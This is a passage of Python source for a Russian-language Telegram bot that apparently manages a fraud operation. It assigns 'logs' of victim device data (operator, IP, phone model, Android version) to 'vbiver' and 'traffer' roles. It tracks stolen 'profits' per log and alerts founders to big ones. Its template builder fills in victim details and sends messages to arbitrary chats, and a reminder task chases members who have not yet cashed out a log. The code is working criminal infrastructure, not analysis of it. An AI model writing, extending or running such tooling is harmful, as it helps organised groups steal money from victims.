async def cb_admin_reports(c: CallbackQuery, db: DB):
    # быстрый экспорт профитов за 30 дней
    out = Path(__file__).with_name("profits_30d.csv")
    await db.export_profits_csv(str(out), days=30)
    await c.message.answer_document(FSInputFile(str(out)), caption="Экспорт профитов за 30 дней (CSV)")
    await c.answer()

# --- VB PANEL ---
@router.callback_query(F.data == "work:vb")
async def cb_vb(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    has_active = bool(await db.get_my_active(c.from_user.id))
    await c.message.edit_text("🧲 Вбив-панель", reply_markup=kb_vb(c.from_user.id, has_active)); await c.answer()

@router.callback_query(F.data == "vb:get")
async def cb_vb_get(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    if await db.get_my_active(c.from_user.id):
        await c.answer("у тебя уже есть активный лог", show_alert=True); return
    row = await db.assign_first_free(c.from_user.id)
    if not row:
        await c.answer("свободных логов нет", show_alert=True); return
    await c.message.edit_text(f"📦 <b>Выдан лог</b>\nUUID: <code>{row['uuid']}</code>",
                              parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, True))
    await c.answer("лог выдан")

@router.callback_query(F.data == "vb:my")
async def cb_vb_my(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    row = await db.get_my_active(c.from_user.id)
    if not row:
        await c.answer("активного лога нет", show_alert=True); return
    await c.message.edit_text(
        f"📦 <b>Мой лог</b>\nUUID: <code>{row['uuid']}</code>\n"
        f"Воркер: {row.get('worker') or '-'} • Оператор: {row.get('operator') or '-'}",
        parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, True)
    )
    await c.answer()

@router.callback_query(F.data == "vb:free")
async def cb_vb_free(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    await db.release_my(c.from_user.id)
    await c.message.edit_text("лог освобождён", reply_markup=kb_vb(c.from_user.id, False)); await c.answer("освобождён")

@router.callback_query(F.data == "vb:profit")
async def cb_vb_profit(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    row = await db.get_my_active(c.from_user.id)
    if not row:
        await c.answer("активного лога нет", show_alert=True); return
    PENDING_PROFIT[c.from_user.id] = row["uuid"]
    await c.message.edit_text("💰 Введите сумму (и заметку) одним сообщением.\nПример: <code>2500 карта тиньк</code>",
                              parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, True))
    await c.answer()

# --- TRAFF PANEL ---
@router.callback_query(F.data == "work:tr")
async def cb_tr(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("📬 Трафф-панель", reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "tr:inbox")
async def cb_tr_inbox(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    rows = await db.inbox_for_trafer(c.from_user.id, since_hours=24)
    if not rows:
        await c.message.edit_text("✉️ Входящие пусто за 24h", reply_markup=kb_tr(c.from_user.id)); await c.answer(); return
    lines = [f"• <code>{r['uuid']}</code> — {r.get('operator') or '-'} — {r.get('source') or '—'}" for r in rows[:30]]
    await c.message.edit_text("✉️ <b>Входящие</b> (24h)\n" + "\n".join(lines),
                              parse_mode="HTML", reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "tr:denied")
async def cb_tr_denied(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    rows = await db.quarantined_for(c.from_user.id)
    uuids = [r["uuid"] for r in rows]
    if not uuids:
        await c.message.edit_text("🚫 Ошибочных логов нет", reply_markup=kb_tr(c.from_user.id)); await c.answer(); return
    await c.message.edit_text("🚫 Ошибки доступа (первые 10):", reply_markup=kb_tr_denied_list(c.from_user.id, uuids))
    await c.answer()

@router.callback_query(F.data.startswith("tr:denied:view:"))
async def cb_tr_denied_view(c: CallbackQuery, db: DB):
    uuid = c.data.split(":")[-1]
    cur = await db.conn.execute("SELECT raw FROM logs WHERE uuid=?", (uuid,))
    row = await cur.fetchone()
    if not row:
        await c.answer("не найдено", show_alert=True); return
    raw = row["raw"] or "(нет raw)"
    await c.message.edit_text(f"UUID: <code>{uuid}</code>\n\n<pre>{raw[:3500]}</pre>", parse_mode="HTML",
                              reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data.startswith("tr:denied:fix:"))
async def cb_tr_denied_fix(c: CallbackQuery, db: DB):
    uuid = c.data.split(":")[-1]
    await db.clear_quarantine(uuid)
    await c.answer("снят с карантина ✅", show_alert=True)
    await cb_tr_denied(c, db=db)

@router.callback_query(F.data.startswith("tr:denied:del:"))
async def cb_tr_denied_del(c: CallbackQuery, db: DB):
    uuid = c.data.split(":")[-1]
    await db.delete_log(uuid)
    await c.answer("удалено 🗑", show_alert=True)
    await cb_tr_denied(c, db=db)

@router.callback_query(F.data == "tr:sources")
async def cb_tr_sources(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    stats = await db.stats_for_trafer(c.from_user.id, "30d")
    await c.message.edit_text("📈 Источники (30d):\n"+("\n".join(stats["top_src"]) or "—"),
                              reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data.startswith("tr:stats:"))
async def cb_tr_stats(c: CallbackQuery, db: DB):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    period = c.data.split(":")[2]
    s = await db.stats_for_trafer(c.from_user.id, period)
    await c.message.edit_text(fmt_stats(s), parse_mode="HTML", reply_markup=kb_tr(c.from_user.id)); await c.answer()

# --- BUILDER (traffer) ---
@router.callback_query(F.data == "tr:builder")
async def cb_tr_builder(c: CallbackQuery, db: DB):
    tpls = await db.list_templates(c.from_user.id)
    await c.message.edit_text("🧱 Билдер шаблонов", reply_markup=kb_builder_menu(tpls)); await c.answer()

@router.callback_query(F.data == "builder:new")
async def cb_tpl_new(c: CallbackQuery):
    PENDING_TPL[c.from_user.id] = {"mode":"name","buffer":{}}
    await c.message.edit_text(
        "🧱 Новый шаблон.\nОтправь <b>название</b> одним сообщением.\n"
        "Плейсхолдеры в тексте: <code>{uuid} {operator} {ip} {model} {android} {worker}</code>",
        parse_mode="HTML"
    ); await c.answer()

@router.callback_query(F.data.startswith("builder:view:"))
async def cb_tpl_view(c: CallbackQuery, db: DB):
    tpl_id = int(c.data.split(":")[2])
    cur = await db.conn.execute("SELECT * FROM templates WHERE id=? AND owner_id=?", (tpl_id, c.from_user.id))
    t = await cur.fetchone()
    if not t:
        await c.answer("не найдено", show_alert=True); return
    await c.message.edit_text(f"📄 <b>{t['name']}</b>\n\n<code>{t['text']}</code>",
                              parse_mode="HTML", reply_markup=kb_tpl_view(tpl_id)); await c.answer()

@router.callback_query(F.data.startswith("builder:del:"))
async def cb_tpl_del(c: CallbackQuery, db: DB):
    tpl_id = int(c.data.split(":")[2])
    await db.delete_template(c.from_user.id, tpl_id)
    tpls = await db.list_templates(c.from_user.id)
    await c.message.edit_text("🗑 Удалено.\n", reply_markup=kb_builder_menu(tpls)); await c.answer()

@router.callback_query(F.data.startswith("builder:send:"))
async def cb_tpl_send(c: CallbackQuery, db: DB):
    _, _, target, tpl_id = c.data.split(":")
    tpl_id = int(tpl_id)
    cur = await db.conn.execute("SELECT * FROM templates WHERE id=? AND owner_id=?", (tpl_id, c.from_user.id))
    t = await cur.fetchone()
    if not t:
        await c.answer("шаблон не найден", show_alert=True); return
    # спросим UUID для подстановки
    PENDING_TPL_SEND[c.from_user.id] = {"tpl_id": tpl_id, "target": target}
    await c.message.edit_text("Введи UUID, для которого формируем сообщение по шаблону.", reply_markup=kb_tr(c.from_user.id)); await c.answer()

# --- TEXT CAPTURE (profit / blacklist / templates / template send) ---
@router.message(F.text)
async def text_capture(m: Message, db: DB, bot: Bot):
    uid = m.from_user.id

    # 1) Profit
    if uid in PENDING_PROFIT:
        uuid = PENDING_PROFIT.pop(uid)
        parts = m.text.strip().split(maxsplit=1)
        try:
            amount = float(parts[0].replace(",", "."))
        except Exception:
            await m.answer("сумма некорректна"); return
        note = parts[1] if len(parts)>1 else ""
        await db.set_profit(uuid, uid, amount, note)
        await m.answer(f"✅ профит {amount:.0f} сохранён для {uuid}")
        if amount >= BIG_PROFIT:
            for fid in FOUNDER_IDS:
                with contextlib.suppress(Exception):
                    await bot.send_message(fid, f"💥 Крупный профит: <b>{amount:.0f}</b>\nUUID: <code>{uuid}</code>", parse_mode="HTML")
        return

    # 2) Blacklist
    act = PENDING_BL_ACTION.pop(uid, None)
    if act:
        uuid = m.text.strip()
        if act == "add":
            await db.blacklist_add(uid, uuid)
            await m.answer(f"✅ Добавлено в blacklist: <code>{uuid}</code>", parse_mode="HTML")
        else:
            await db.blacklist_del(uuid)
            await m.answer(f"🗑 Удалено из blacklist: <code>{uuid}</code>", parse_mode="HTML")
        return

    # 3) Builder create
    st = PENDING_TPL.get(uid)
    if st:
        if st["mode"] == "name":
            st["buffer"]["name"] = m.text.strip()[:64]
            st["mode"] = "text"
            await m.answer("Отправь <b>текст шаблона</b>.", parse_mode="HTML"); return
        elif st["mode"] == "text":
            name = st["buffer"]["name"]; text = m.text
            await db.add_template(uid, name, text)
            PENDING_TPL.pop(uid, None)
            await m.answer(f"✅ Шаблон «{name}» сохранён.")
            return

    # 4) Builder send: ожидаем UUID
    st2 = PENDING_TPL_SEND.get(uid)
    if st2:
        uuid = m.text.strip()
        cur = await db.conn.execute("SELECT * FROM logs WHERE uuid=?", (uuid,))
        logrow = await cur.fetchone()
        if not logrow:
            await m.answer("uuid не найден"); return
        cur = await db.conn.execute("SELECT * FROM templates WHERE id=? AND owner_id=?", (st2["tpl_id"], uid))
        tpl = await cur.fetchone()
        if not tpl:
            await m.answer("шаблон не найден"); return
        # подстановка
        txt = tpl["text"]
        def _sub(s: str) -> str:
            return (s.replace("{uuid}", logrow["uuid"] or "")
                    .replace("{operator}", logrow["operator"] or "")
                    .replace("{ip}", logrow["ip"] or "")
                    .replace("{model}", logrow["model"] or "")
                    .replace("{android}", logrow["android"] or "")
                    .replace("{worker}", logrow["worker"] or ""))
        msg = _sub(txt)
        if st2["target"] == "self":
            await m.answer(msg or "(пусто)")
        else:
            await m.answer("Введи chat_id для отправки (число).")
            # ждём второй шаг: chat_id
            PENDING_TPL_SEND[uid] = {"tpl_id": st2["tpl_id"], "uuid": uuid, "target":"chat", "stage":"chat_id", "prepared": msg}
        return
    # 4b) Builder send: ждём chat_id
    st3 = PENDING_TPL_SEND.get(uid)
    if st3 and st3.get("stage") == "chat_id":
        try:
            chat_id = int(m.text.strip())
        except Exception:
            await m.answer("chat_id некорректен"); return
        with contextlib.suppress(Exception):
            await bot.send_message(chat_id, st3["prepared"])
        PENDING_TPL_SEND.pop(uid, None)
        await m.answer("📤 Отправлено.")
        return

# ---------------------- SLA REMINDER TASK ----------------------
async def sla_reminder_task(bot: Bot, db: DB):
    # каждые 15 минут пинговать логов, висящих дольше SLA без профита
    while True:
        try:
            hours = max(1, SLA_HOURS)
            since = (datetime.now(timezone.utc) - timedelta(hours=hours)).isoformat()
            cur = await db.conn.execute("""
            SELECT uuid, assigned_to, assigned_at FROM logs
            WHERE assigned_to IS NOT NULL AND profited_at IS NULL AND assigned_at<=?
            """, (since,))
            rows = await cur.fetchall()
            for r in rows:
                uid = r["assigned_to"]
                if not uid: continue
                with contextlib.suppress(Exception):
                    await bot.send_message(uid, f"⏰ SLA: лог <code>{r['uuid']}</code> висит больше {hours}ч — проверь.", parse_mode="HTML")
        except Exception as e:
            log.warning("SLA task error: %r", e)
        await asyncio.sleep(900)

# ---------------------- BOOTSTRAP ----------------------
async def setup_bot_commands(bot: Bot):
    await bot.set_my_commands([
        BotCommand(command="start",   description="Запуск"),
        BotCommand(command="menu",    description="Ворк-панель"),
        BotCommand(command="ping",    description="Проверка"),
        BotCommand(command="devices", description="Список устройств"),
        BotCommand(command="device",  description="Карточка устройства"),
        BotCommand(command="whoami",  description="Мой user_id"),
        BotCommand(command="whereami",description="ID чата"),
    ])

async def seed_roles(db: DB):
    for uid in FOUNDER_IDS: await db.upsert_role(uid, "founder")
    for uid in VBIVER_IDS:  await db.upsert_role(uid, "vbiver")
    for uid in TRAFFER_IDS: await db.upsert_role(uid, "traffer")

# ---------------------- APP MAIN ----------------------
async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN пуст"); return

    db = DB(DB_PATH); await db.open(); await seed_roles(db)

    bot = Bot(BOT_TOKEN)
    await setup_bot_commands(bot)

    dp = Dispatcher()
    dp.include_router(router)

    # DI для хендлеров
    dp["db"] = db

    ws = WSClient(bot, db)
    dp["ws"] = ws

    tasks = [
        asyncio.create_task(ws.run()),
        asyncio.create_task(sla_reminder_task(bot, db)),
    ]
    try:
        await dp.start_polling(bot, db=db, ws=ws)
    finally:
        for t in tasks:
            t.cancel()
        with contextlib.suppress(Exception):
            await asyncio.gather(*tasks)
        await db.close()

if __name__ == "__main__":
    asyncio.run(main())
